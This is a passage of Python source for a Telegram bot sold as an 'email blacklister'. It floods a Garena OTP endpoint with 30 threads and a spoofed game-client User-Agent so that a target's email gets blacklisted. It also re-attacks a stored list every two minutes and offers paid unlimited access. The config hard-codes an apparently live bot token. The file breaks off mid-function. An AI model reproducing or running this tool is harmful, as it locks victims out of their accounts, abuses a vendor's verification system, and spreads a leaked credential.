import os
import sys
import time
import threading
import requests
import urllib3
import json
import asyncio
from datetime import datetime

# ==================== CONFIG ====================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8947082460:AAHDGKRWoqhHb4_FHkxykIMsFl7E0zWTVe0")
OWNER_ID = int(os.getenv("OWNER_ID", "6863389453"))
OWNER_USERNAME = os.getenv("OWNER_USERNAME", "@CURRENTTTTTTTT")
FORCE_CHANNEL_USERNAME = os.getenv("FORCE_CHANNEL_USERNAME", "@Adityaapis_570")
FORCE_CHANNEL_LINK = os.getenv("FORCE_CHANNEL_LINK", "https://t.me/Adityaapis_570")
PORT = int(os.getenv("PORT", "8080"))

DATA_DIR = os.getenv("DATA_DIR", ".")
try:
    os.makedirs(DATA_DIR, exist_ok=True)
except Exception:
    DATA_DIR = "."

os.environ['TZ'] = 'Asia/Kolkata'
try:
    time.tzset()
except AttributeError:
    pass

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.request import HTTPXRequest
from telegram.error import Conflict, NetworkError, TimedOut

from flask import Flask

C = "\033[1;36m"
G = "\033[1;32m"
R = "\033[1;31m"
Y = "\033[1;33m"
W = "\033[1;37m"
B = "\033[1m"
S = "\033[0m"

print(f"{G}[+] Bot is starting...{S}", flush=True)

ADMIN_FILE = os.path.join(DATA_DIR, "admins.json")
BANNED_FILE = os.path.join(DATA_DIR, "banned_users.json")
SUBSCRIBER_FILE = os.path.join(DATA_DIR, "subscribers.json")
SETTINGS_FILE = os.path.join(DATA_DIR, "settings.json")
AUTO_BLACKLIST_FILE = os.path.join(DATA_DIR, "auto_emails.json")
BROADCAST_FILE = os.path.join(DATA_DIR, "users.json")

NUM_WORKERS = 30
MAX_BLACKLIST_LIMIT = 1
AUTO_INTERVAL_MINUTES = 2
AUTO_INTERVAL_SECONDS = AUTO_INTERVAL_MINUTES * 60
WORKER_TIMEOUT = 25

any_success_lock = threading.Lock()
any_success = False
error_event = threading.Event()
stop_event = threading.Event()
error_print_lock = threading.Lock()
generation = 0
user_states = {}
auto_emails_list = []
users_list = []
admins_list = []
banned_users_list = []
subscribers_list = []

total_attempts_ever = 0
last_auto_run = 0.0

print(f"{G}[+] Global variables initialized (DATA_DIR={DATA_DIR}){S}", flush=True)


# ==================== FLASK HEALTH ====================
flask_app = Flask(__name__)

@flask_app.route('/')
@flask_app.route('/health')
def health():
    return {
        "status": "ok",
        "bot": "running",
        "users": len(users_list),
        "auto_emails": len(auto_emails_list),
        "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }, 200

def run_flask():
    try:
        flask_app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
    except Exception as e:
        print(f"{R}[!] Flask error: {e}{S}", flush=True)


# ==================== SETTINGS ====================
def load_settings():
    global MAX_BLACKLIST_LIMIT
    try:
        if os.path.exists(SETTINGS_FILE):
            with open(SETTINGS_FILE, 'r') as f:
                data = json.load(f)
            if isinstance(data, dict) and "max_blacklist_limit" in data:
                try:
                    val = int(data["max_blacklist_limit"])
                    if val >= 0:
                        MAX_BLACKLIST_LIMIT = val
                except Exception:
                    pass
            print(f"{G}[+] Loaded settings. Daily limit = {MAX_BLACKLIST_LIMIT}{S}", flush=True)
        else:
            save_settings()
            print(f"{G}[+] Created default settings. Daily limit = {MAX_BLACKLIST_LIMIT}{S}", flush=True)
    except Exception as e:
        print(f"{R}[!] Error loading settings: {e}{S}", flush=True)


def save_settings():
    try:
        with open(SETTINGS_FILE, 'w') as f:
            json.dump({"max_blacklist_limit": MAX_BLACKLIST_LIMIT}, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving settings: {e}{S}", flush=True)


def set_max_limit(new_limit: int):
    global MAX_BLACKLIST_LIMIT
    if new_limit < 0:
        return False, "Limit cannot be negative!"
    MAX_BLACKLIST_LIMIT = new_limit
    save_settings()
    return True, f"Daily blacklist limit set to {MAX_BLACKLIST_LIMIT} per user"


# ==================== BANNED ====================
def load_banned_users():
    global banned_users_list
    try:
        if os.path.exists(BANNED_FILE):
            with open(BANNED_FILE, 'r') as f:
                banned_users_list = json.load(f)
            print(f"{G}[+] Loaded {len(banned_users_list)} banned users{S}", flush=True)
        else:
            banned_users_list = []
            save_banned_users()
    except Exception as e:
        print(f"{R}[!] Error loading banned users: {e}{S}", flush=True)
        banned_users_list = []


def save_banned_users():
    try:
        with open(BANNED_FILE, 'w') as f:
            json.dump(banned_users_list, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving banned users: {e}{S}", flush=True)


def is_user_banned(user_id):
    return user_id in banned_users_list


def ban_user(user_id):
    global banned_users_list
    if user_id == OWNER_ID:
        return False, "Cannot ban the owner!"
    if is_admin(user_id):
        return False, "Cannot ban an admin!"
    if user_id in banned_users_list:
        return False, "User is already banned!"
    banned_users_list.append(user_id)
    save_banned_users()
    return True, "User banned successfully!"


def unban_user(user_id):
    global banned_users_list
    if user_id not in banned_users_list:
        return False, "User is not banned!"
    banned_users_list.remove(user_id)
    save_banned_users()
    return True, "User unbanned successfully!"


# ==================== ADMINS ====================
def load_admins():
    global admins_list
    try:
        if os.path.exists(ADMIN_FILE):
            with open(ADMIN_FILE, 'r') as f:
                admins_list = json.load(f)
            print(f"{G}[+] Loaded {len(admins_list)} admins{S}", flush=True)
        else:
            admins_list = []
            save_admins()
    except Exception as e:
        print(f"{R}[!] Error loading admins: {e}{S}", flush=True)
        admins_list = []


def save_admins():
    try:
        with open(ADMIN_FILE, 'w') as f:
            json.dump(admins_list, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving admins: {e}{S}", flush=True)


def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    return user_id in admins_list


# ==================== SUBSCRIBERS ====================
def load_subscribers():
    global subscribers_list
    try:
        if os.path.exists(SUBSCRIBER_FILE):
            with open(SUBSCRIBER_FILE, 'r') as f:
                subscribers_list = json.load(f)
            print(f"{G}[+] Loaded {len(subscribers_list)} subscribers{S}", flush=True)
        else:
            subscribers_list = []
            save_subscribers()
    except Exception as e:
        print(f"{R}[!] Error loading subscribers: {e}{S}", flush=True)
        subscribers_list = []


def save_subscribers():
    try:
        with open(SUBSCRIBER_FILE, 'w') as f:
            json.dump(subscribers_list, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving subscribers: {e}{S}", flush=True)


def is_subscribed(user_id):
    return user_id in subscribers_list


def subscribe_user(user_id):
    global subscribers_list
    if user_id == OWNER_ID:
        return False, "Owner already has unlimited access!"
    if is_admin(user_id):
        return False, "Admins already have unlimited access!"
    if user_id in subscribers_list:
        return False, "User is already subscribed!"
    subscribers_list.append(user_id)
    save_subscribers()
    return True, "Subscription added successfully!"


def unsubscribe_user(user_id):
    global subscribers_list
    if user_id not in subscribers_list:
        return False, "User is not subscribed!"
    subscribers_list.remove(user_id)
    save_subscribers()
    return True, "Subscription removed successfully!"


def has_unlimited_access(user_id):
    return is_admin(user_id) or is_subscribed(user_id)


# ==================== USERS ====================
def _today_str():
    return datetime.now().strftime('%Y-%m-%d')


def _ensure_daily_reset(user):
    today = _today_str()
    if user.get('daily_date') != today:
        user['daily_count'] = 0
        user['daily_date'] = today
        return True
    return False


def load_users():
    global users_list
    try:
        if os.path.exists(BROADCAST_FILE):
            with open(BROADCAST_FILE, 'r') as f:
                users_list = json.load(f)
            migrated = False
            for u in users_list:
                if 'daily_count' not in u:
                    u['daily_count'] = 0
                    migrated = True
                if 'daily_date' not in u:
                    u['daily_date'] = _today_str()
                    migrated = True
                if 'blacklist_count' not in u:
                    u['blacklist_count'] = 0
                    migrated = True
            if migrated:
                save_users()
            print(f"{G}[+] Loaded {len(users_list)} users for broadcast{S}", flush=True)
        else:
            users_list = []
            save_users()
    except Exception as e:
        print(f"{R}[!] Error loading users: {e}{S}", flush=True)
        users_list = []


def save_users():
    try:
        with open(BROADCAST_FILE, 'w') as f:
            json.dump(users_list, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving users: {e}{S}", flush=True)


def add_user(user_id, username, full_name):
    global users_list
    if user_id is None:
        return False
    for user in users_list:
        if user['id'] == user_id:
            return False

    today = _today_str()
    users_list.append({
        'id': user_id,
        'username': username if username else 'N/A',
        'name': full_name if full_name else 'Unknown',
        'joined': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'blacklist_count': 0,
        'daily_count': 0,
        'daily_date': today
    })
    save_users()
    return True


def is_new_user(user_id):
    for user in users_list:
        if user['id'] == user_id:
            return False
    return True


def get_user_blacklist_count(user_id):
    for user in users_list:
        if user['id'] == user_id:
            if _ensure_daily_reset(user):
                save_users()
            return user.get('daily_count', 0)
    return 0


def get_user_total_count(user_id):
    for user in users_list:
        if user['id'] == user_id:
            return user.get('blacklist_count', 0)
    return 0


def increment_blacklist_count(user_id):
    for user in users_list:
        if user['id'] == user_id:
            _ensure_daily_reset(user)
            user['daily_count'] = user.get('daily_count', 0) + 1
            user['blacklist_count'] = user.get('blacklist_count', 0) + 1
            save_users()
            return True
    return False


def find_user_by_id(user_id):
    for user in users_list:
        if user['id'] == user_id:
            return user
    return None


# ==================== AUTO EMAILS ====================
def load_auto_emails():
    global auto_emails_list
    try:
        if os.path.exists(AUTO_BLACKLIST_FILE):
            with open(AUTO_BLACKLIST_FILE, 'r') as f:
                data = json.load(f)
                if isinstance(data, list):
                    auto_emails_list = [str(e).strip() for e in data if e]
                else:
                    auto_emails_list = []
            print(f"{G}[+] Loaded {len(auto_emails_list)} auto blacklist emails{S}", flush=True)
        else:
            auto_emails_list = []
            save_auto_emails()
    except Exception as e:
        print(f"{R}[!] Error loading emails: {e}{S}", flush=True)
        auto_emails_list = []


def save_auto_emails():
    try:
        with open(AUTO_BLACKLIST_FILE, 'w') as f:
            json.dump(auto_emails_list, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving emails: {e}{S}", flush=True)


# ==================== WORKER ====================
def worker(email, gen):
    global any_success
    while not stop_event.is_set():
        if gen != generation:
            return
        url = "https://swap-otp-sender.vercel.app/send"
        headers = {
            "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        data = {
            "app_id": "100067",
            "email": email,
            "locale": "en_HK"
        }

        try:
            resp = requests.post(url, headers=headers, data=data, timeout=15)
            if resp.status_code == 200:
                with any_success_lock:
                    any_success = True
            else:
                with error_print_lock:
                    if not error_event.is_set():
                        error_event.set()
                        stop_event.set()
                return
        except Exception:
            with error_print_lock:
                if not error_event.is_set():
                    error_event.set()
                    stop_event.set()
            return


def wait_for_error(timeout=WORKER_TIMEOUT):
    stop_event.wait(timeout=timeout)


def blacklist_email(email):
    global any_success, error_event, stop_event, generation

    generation += 1
    any_success = False
    error_event.clear()
    stop_event.clear()

    threads = []
    for _ in range(NUM_WORKERS):
        t = threading.Thread(target=worker, args=(email, generation))
        t.daemon = True
        t.start()
        threads.append(t)

    wait_for_error(timeout=WORKER_TIMEOUT)
    stop_event.set()

    for t in threads:
        t.join(timeout=2)

    if error_event.is_set():
        if not any_success:
            return False, "🔴 EMAIL ALREADY BLACKLISTED"
        else:
            return True, "🟢 EMAIL BLACKLISTED SUCCESSFULLY"
    else:
        if any_success:
            return True, "🟢 EMAIL BLACKLISTED SUCCESSFULLY"
        return False, "⚠️ TIMEOUT - TRY AGAIN"


# ==================== AUTO JOB ====================
async def auto_blacklist_job(context: ContextTypes.DEFAULT_TYPE):
    global any_success, error_event, stop_event, generation, total_attempts_ever

    print(f"{G}[+] Auto blacklist job triggered at {datetime.now().strftime('%H:%M:%S')}{S}", flush=True)

    if not auto_emails_list:
        print(f"{Y}[!] No emails in auto blacklist{S}", flush=True)
        return

    if OWNER_ID:
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"🤖 AUTO BLACKLIST STARTED\n\nTotal emails: {len(auto_emails_list)}\nTime: {datetime.now().strftime('%I:%M %p')}"
            )
        except Exception as e:
            print(f"{R}[!] Failed to notify owner: {e}{S}", flush=True)

    results = {"success": 0, "failed": 0, "skipped": 0, "total": len(auto_emails_list)}
    emails_to_process = list(auto_emails_list)

    for email in emails_to_process:
        print(f"{C}[+] Auto blacklisting: {email}{S}", flush=True)

        any_success = False
        error_event.clear()
        stop_event.clear()
        generation += 1

        threads = []
        for _ in range(NUM_WORKERS):
            t = threading.Thread(target=worker, args=(email, generation))
            t.daemon = True
            t.start()
            threads.append(t)

        wait_for_error(timeout=WORKER_TIMEOUT)
        stop_event.set()

        for t in threads:
            t.join(timeout=2)

        total_attempts_ever += 1

        if any_success:
            results["success"] += 1
            print(f"{G}[+] Success: {email}{S}", flush=True)
        elif error_event.is_set():
            results["skipped"] += 1
            print(f"{Y}[!] Skipped (already blacklisted): {email}{S}", flush=True)
        else:
            results["failed"] += 1
            print(f"{R}[!] Failed: {email}{S}", flush=True)

        time.sleep(2)

    if OWNER_ID:
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"""✅ AUTO BLACKLIST COMPLETE

Results:
Total: {results['total']}
Success: {results['success']}
Failed: {results['failed']}
Skipped (Already Blacklisted): {results['skipped']}

Total attempts ever: {total_attempts_ever}

Time: {datetime.now().strftime('%I:%M %p')}
Date: {datetime.now().strftime('%d-%m-%Y')}"""
            )
        except Exception as e:
            print(f"{R}[!] Failed to notify owner: {e}{S}", flush=True)

    print(f"{G}[+] Auto blacklist complete: {results}{S}", flush=True)


# ==================== BAN/UNBAN ====================
async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        await update.message.reply_text("❌ Error: Could not identify user.")
        return
    if not is_admin(user.id):
        await update.message.reply_text("⛔ ACCESS DENIED\n\n❌ Only admins can use this command!")
        return
    if not context.args:
        await update.message.reply_text("🚫 BAN USER\n\nUsage: /ban <user_id>\n\nExample: /ban 123456789")
        return
    try:
        target_id = int(context.args[0])
        success, msg = ban_user(target_id)
        if success:
            try:
                await context.bot.send_message(chat_id=target_id, text=f"🚫 YOU HAVE BEEN BANNED!\n\nContact: {OWNER_USERNAME}")
            except Exception:
                pass
            await update.message.reply_text(f"✅ {msg}")
        else:
            await update.message.reply_text(f"❌ {msg}")
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID!")


async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        await update.message.reply_text("❌ Error: Could not identify user.")
        return
    if not is_admin(user.id):
        await update.message.reply_text("⛔ ACCESS DENIED")
        return
    if not context.args:
        await update.message.reply_text("✅ UNBAN USER\n\nUsage: /unban <user_id>")
        return
    try:
        target_id = int(context.args[0])
        success, msg = unban_user(target_id)
        if success:
            try:
                await context.bot.send_message(chat_id=target_id, text=f"✅ YOU HAVE BEEN UNBANNED!\n\nContact: {OWNER_USERNAME}")
            except Exception:
                pass
            await update.message.reply_text(f"✅ {msg}")
        else:
            await update.message.reply_text(f"❌ {msg}")
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID!")


async def banned_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or not is_admin(user.id):
        await update.message.reply_text("⛔ ACCESS DENIED")
        return
    if not banned_users_list:
        await update.message.reply_text("📋 BANNED USERS\n\nNo users are banned.")
        return
    banned_text = "\n".join([f"• ID: {uid}" for uid in banned_users_list])
    await update.message.reply_text(f"📋 BANNED USERS\n\n{banned_text}\n\nTotal: {len(banned_users_list)} users")


# ==================== SETLIMIT ====================
async def setlimit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or user.id != OWNER_ID:
        await update.message.reply_text("⛔ Only OWNER can use this command!")
        return
    if not context.args:
        await update.message.reply_text(
            f"⚙️ SET DAILY LIMIT\n\nCurrent daily limit: {MAX_BLACKLIST_LIMIT} per user\n\n"
            f"Usage: /setlimit <number>\nExample: /setlimit 2\n\n"
            f"ℹ️ Normal users get this many blacklists PER DAY.\nℹ️ Subscribers & admins always unlimited."
        )
        return
    try:
        new_limit = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid number!")
        return
    success, msg = set_max_limit(new_limit)
    if success:
        await update.message.reply_text(f"✅ UPDATED\n\n{msg}\n\nℹ️ Resets daily at 12:00 AM IST.")
    else:
        await update.message.reply_text(f"❌ {msg}")


# ==================== SUBSCRIBE ====================
async def subscribe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or user.id != OWNER_ID:
        await update.message.reply_text("⛔ Only OWNER can use this!")
        return
    if not context.args:
        await update.message.reply_text("💎 SUBSCRIBE\n\nUsage: /subscribe <user_id>")
        return
    try:
        target_id = int(context.args[0])
        success, msg = subscribe_user(target_id)
        if success:
            try:
                await context.bot.send_message(chat_id=target_id, text=f"💎 SUBSCRIPTION ACTIVATED!\n\nYou now have UNLIMITED access!\n\nContact: {OWNER_USERNAME}")
            except Exception:
                pass
            await update.message.reply_text(f"✅ {msg}")
        else:
            await update.message.reply_text(f"❌ {msg}")
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID!")


async def unsubscribe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or user.id != OWNER_ID:
        await update.message.reply_text("⛔ Only OWNER can use this!")
        return
    if not context.args:
        await update.message.reply_text("❌ UNSUBSCRIBE\n\nUsage: /unsubscribe <user_id>")
        return
    try:
        target_id = int(context.args[0])
        success, msg = unsubscribe_user(target_id)
        if success:
            try:
                await context.bot.send_message(chat_id=target_id, text=f"❌ SUBSCRIPTION REMOVED\n\nContact: {OWNER_USERNAME}")
            except Exception:
                pass
            await update.message.reply_text(f"✅ {msg}")
        else:
            await update.message.reply_text(f"❌ {msg}")
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID!")


async def checksub_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        return
    if context.args:
        if user.id != OWNER_ID:
            await update.message.reply_text("⛔ Only OWNER!")
            return
        try:
            target_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ Invalid User ID!")
            return
    else:
        target_id = user.id

    is_sub = is_subscribed(target_id)
    is_adm = is_admin(target_id)

    if target_id == OWNER_ID:
        status = "👑 OWNER (Unlimited)"
    elif is_adm:
        status = "🛡️ ADMIN (Unlimited)"
    elif is_sub:
        status = "💎 SUBSCRIBED (Unlimited)"
    else:
        daily = get_user_blacklist_count(target_id)
        total = get_user_total_count(target_id)
        remaining = MAX_BLACKLIST_LIMIT - daily
        if remaining < 0:
            remaining = 0
        status = f"👤 NORMAL\n\nToday: {daily}/{MAX_BLACKLIST_LIMIT}\nRemaining today: {remaining}\nTotal ever: {total}"

    await update.message.reply_text(f"📊 STATUS\n\nUser ID: {target_id}\nStatus: {status}")


async def sublist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or not is_admin(user.id):
        await update.message.reply_text("⛔ ACCESS DENIED")
        return
    if not subscribers_list:
        await update.message.reply_text("💎 SUBSCRIBERS LIST\n\nNo subscribers yet.")
        return
    subs_text = "\n".join([f"• ID: {sid}" for sid in subscribers_list])
    await update.message.reply_text(f"💎 SUBSCRIBERS LIST\n\n{subs_text}\n\nTotal: {len(subscribers_list)} subscribers")


# ==================== BROADCAST ====================
async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or not is_admin(user.id):
        await update.message.reply_text("⛔ ACCESS DENIED")
        return
    if not context.args:
        await update.message.reply_text("📢 BROADCAST\n\nUsage: /broadcast <message>")
        return
    broadcast_msg = ' '.join(context.args)
    keyboard = [
        [InlineKeyboardButton("✅ YES, SEND", callback_data='broadcast_yes')],
        [InlineKeyboardButton("❌ NO, CANCEL", callback_data='broadcast_no')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"📢 BROADCAST PREVIEW\n\nMessage: {broadcast_msg}\n\nTotal Users: {len(users_list)}\n\n⚠️ Send to ALL users?\n\nAre you sure?",
        reply_markup=reply_markup
    )
    context.user_data['broadcast_msg'] = broadcast_msg


async def broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    if user is None or not is_admin(user.id):
        await query.edit_message_text("⛔ ACCESS DENIED")
        return
    data = query.data
    broadcast_msg = context.user_data.get('broadcast_msg', '')
    if data == 'broadcast_yes':
        await query.edit_message_text("📢 BROADCAST STARTED...")
        success_count = 0
        fail_count = 0
        for user_data in users_list:
            if is_user_banned(user_data['id']):
                continue
            try:
                await context.bot.send_message(
                    chat_id=user_data['id'],
                    text=f"📢 BROADCAST\n\n{broadcast_msg}\n\n👑 From: {OWNER_USERNAME}"
                )
                success_count += 1
                await asyncio.sleep(0.1)
            except Exception:
                fail_count += 1
        await query.edit_message_text(
            f"✅ BROADCAST COMPLETE\n\n✅ Sent: {success_count}\n❌ Failed: {fail_count}\n📌 Total: {len(users_list)}"
        )
    elif data == 'broadcast_no':
        await query.edit_message_text("❌ BROADCAST CANCELLED")


# ==================== MENU ====================
def get_main_menu_keyboard(user_id):
    if is_admin(user_id):
        keyboard = [
            [InlineKeyboardButton("✅ BLACKLIST NOW", callback_data='blacklist')],
            [InlineKeyboardButton("📂 ADD AUTO BLACKLIST", callback_data='add_auto')],
            [InlineKeyboardButton("📁 VIEW AUTO LIST", callback_data='view_auto')],
            [InlineKeyboardButton("🏠 CLEAR AUTO LIST", callback_data='clear_auto')],
            [InlineKeyboardButton("❌ REMOVE FROM AUTO", callback_data='remove_auto')],
            [InlineKeyboardButton("⚙️ SET DAILY LIMIT", callback_data='setlimit_menu')],
            [InlineKeyboardButton("🔗 BROADCAST", callback_data='broadcast')],
            [InlineKeyboardButton("📱 USERS", callback_data='users')],
            [InlineKeyboardButton("🚫 BAN USER", callback_data='ban')],
            [InlineKeyboardButton("✅ UNBAN USER", callback_data='unban')],
            [InlineKeyboardButton("📋 BANNED LIST", callback_data='bannedlist')],
            [InlineKeyboardButton("💎 SUBSCRIBERS", callback_data='sublist')],
            [InlineKeyboardButton("📊 HELP & GUIDE", callback_data='help')],
            [InlineKeyboardButton("👤 OWNER", callback_data='owner')],
            [InlineKeyboardButton("📋 STATUS", callback_data='status')],
            [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
        ]
    elif is_subscribed(user_id):
        keyboard = [
            [InlineKeyboardButton("✅ BLACKLIST NOW", callback_data='blacklist')],
            [InlineKeyboardButton("💎 SUBSCRIBED - UNLIMITED", callback_data='mylimit')],
            [InlineKeyboardButton("📊 HELP & GUIDE", callback_data='help')],
            [InlineKeyboardButton("👤 OWNER", callback_data='owner')],
            [InlineKeyboardButton("📋 STATUS", callback_data='status')],
            [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
        ]
    else:
        count = get_user_blacklist_count(user_id)
        keyboard = [
            [InlineKeyboardButton("✅ BLACKLIST NOW", callback_data='blacklist')],
            [InlineKeyboardButton(f"📊 TODAY: {count}/{MAX_BLACKLIST_LIMIT}", callback_data='mylimit')],
            [InlineKeyboardButton("📊 HELP & GUIDE", callback_data='help')],
            [InlineKeyboardButton("👤 OWNER", callback_data='owner')],
            [InlineKeyboardButton("📋 STATUS", callback_data='status')],
            [InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]
        ]
    return InlineKeyboardMarkup(keyboard)


# ==================== START ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        if user is None:
            await update.message.reply_text("❌ Error: Could not identify user.")
            return
        user_id = user.id
        if is_user_banned(user_id):
            await update.message.reply_text(f"🚫 YOU ARE BANNED!\n\nContact: {OWNER_USERNAME}")
            return
        user_states[user_id] = "idle"
        is_new = is_new_user(user_id)
        add_user(user_id, user.username, user.full_name)
        is_member = await check_channel_membership(context, user_id)
        if user_id != OWNER_ID and not is_member:
            await send_force_channel_message(update, context)
            return
        if is_new:
            await notify_owner_new_user(context, user)
        reply_markup = get_main_menu_keyboard(user_id)

        if user_id == OWNER_ID:
            welcome_text = (f"✨🌟 EMAIL BLACKLISTER 🌟✨\n\n"
                            f"👑 Welcome {user.full_name if user.full_name else 'User'}! (OWNER)\n\n"
                            f"🎯 Auto Blacklist: Every {AUTO_INTERVAL_MINUTES} min\n"
                            f"📊 Daily Limit: {MAX_BLACKLIST_LIMIT}/user\n\n"
                            f"👑 Owner: {OWNER_USERNAME}")
        elif is_admin(user_id):
            welcome_text = (f"✨🌟 EMAIL BLACKLISTER 🌟✨\n\n"
                            f"🛡️ Welcome {user.full_name if user.full_name else 'User'}! (ADMIN)\n\n"
                            f"📊 Daily Limit: {MAX_BLACKLIST_LIMIT}/user (normal users)\n\n"
                            f"👑 Owner: {OWNER_USERNAME}")
        elif is_subscribed(user_id):
            welcome_text = (f"✨🌟 EMAIL BLACKLISTER 🌟✨\n\n"
                            f"💎 Welcome {user.full_name if user.full_name else 'User'}! (SUBSCRIBED)\n\n"
                            f"💎 Unlimited Access\n\n"
                            f"👑 Owner: {OWNER_USERNAME}")
        else:
            count = get_user_blacklist_count(user_id)
            remaining = MAX_BLACKLIST_LIMIT - count
            if remaining < 0:
                remaining = 0
            welcome_text = (f"✨🌟 EMAIL BLACKLISTER 🌟✨\n\n"
                            f"🌟 Welcome {user.full_name if user.full_name else 'User'}!\n\n"
                            f"📊 Today: {count}/{MAX_BLACKLIST_LIMIT}\n"
                            f"📌 Remaining today: {remaining}\n\n"
                            f"💎 Unlimited? Contact: {OWNER_USERNAME}")

        await update.message.reply_text(welcome_text, reply_markup=reply_markup)
    except Exception as e:
        print(f"{R}[!] Error in start: {e}{S}", flush=True)


# ==================== BUTTONS ====================
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user = update.effective_user
        if user is None:
            await query.edit_message_text("❌ Error")
            return
        user_id = user.id
        if is_user_banned(user_id):
            await query.edit_message_text("🚫 YOU ARE BANNED!")
            return
        data = query.data
        if user_id != OWNER_ID:
            is_member = await check_channel_membership(context, user_id)
            if not is_member:
                await send_force_channel_message_update(query)
                return

        if data == 'blacklist':
            if not has_unlimited_access(user_id):
                count = get_user_blacklist_count(user_id)
                if count >= MAX_BLACKLIST_LIMIT:
                    await query.edit_message_text(
                        f"❌ DAILY LIMIT REACHED!\n\nYou have used {count}/{MAX_BLACKLIST_LIMIT} today.\n\n"
                        f"🕛 Resets at 12:00 AM IST\n\n💎 Unlimited? {OWNER_USERNAME}"
                    )
                    return
            user_states[user_id] = "awaiting_email"
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]])
            await query.edit_message_text("📧 ENTER EMAIL\n\nExample: user@example.com", reply_markup=reply_markup)

        elif data == 'mylimit':
            if is_admin(user_id):
                await query.edit_message_text(f"📊 ACCESS\n\n🛡️ ADMIN - Unlimited!\n\n(Daily limit for normal users: {MAX_BLACKLIST_LIMIT})")
            elif is_subscribed(user_id):
                await query.edit_message_text(f"📊 ACCESS\n\n💎 SUBSCRIBED - Unlimited!\n\n(Daily limit for normal users: {MAX_BLACKLIST_LIMIT})")
            else:
                count = get_user_blacklist_count(user_id)
                remaining = MAX_BLACKLIST_LIMIT - count
                if remaining < 0:
                    remaining = 0
                await query.edit_message_text(
                    f"📊 YOUR DAILY LIMIT\n\nToday: {count}/{MAX_BLACKLIST_LIMIT}\n"
                    f"Remaining today: {remaining}\n\n🕛 Resets at 12:00 AM IST\n\n💎 Unlimited? {OWNER_USERNAME}"
                )

        elif data == 'setlimit_menu':
            if user_id != OWNER_ID:
                await query.edit_message_text("⛔ Only OWNER can change the limit!")
                return
            user_states[user_id] = "awaiting_setlimit"
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]])
            await query.edit_message_text(
                f"⚙️ SET DAILY LIMIT\n\nCurrent: {MAX_BLACKLIST_LIMIT} per user per day\n\n"
                f"Send the new daily limit number (e.g. 2).\n\nℹ️ Subscribers & admins always unlimited.",
                reply_markup=reply_markup
            )

        elif data == 'add_auto':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Only admins!")
                return
            user_states[user_id] = "awaiting_auto_email"
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]])
            await query.edit_message_text(
                "📧 ADD AUTO\n\nSend email(s).\n\nFormat:\nSingle: user@x.com\nMultiple: a@x.com, b@x.com",
                reply_markup=reply_markup
            )

        elif data == 'remove_auto':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Only admins!")
                return
            user_states[user_id] = "awaiting_remove_email"
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data='cancel')]])
            await query.edit_message_text("❌ REMOVE FROM AUTO\n\nSend email(s) to remove.", reply_markup=reply_markup)

        elif data == 'view_auto':
            if not is_admin(user_id):
                await query.edit_message_text("⛔ Only admins!")
                return
            if auto_emails_list:
                email_list = "\n".join([f"• {e}" for e in auto_emails_list])
                text = f"📋 AUTO LIST\n\nTotal: {len(auto_emails_list)}\n\n{email_list}\n\nInterval: Every {AUTO_INTERVAL_MINUTES} min"
            else:
                text = "📋 AUTO LIST\n\nNo emails."
            reply_markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]])
            await query.edit_message_text(text, reply_markup=reply_markup)

        elif data == 'clear_auto':
            if not is_admin(user_id):
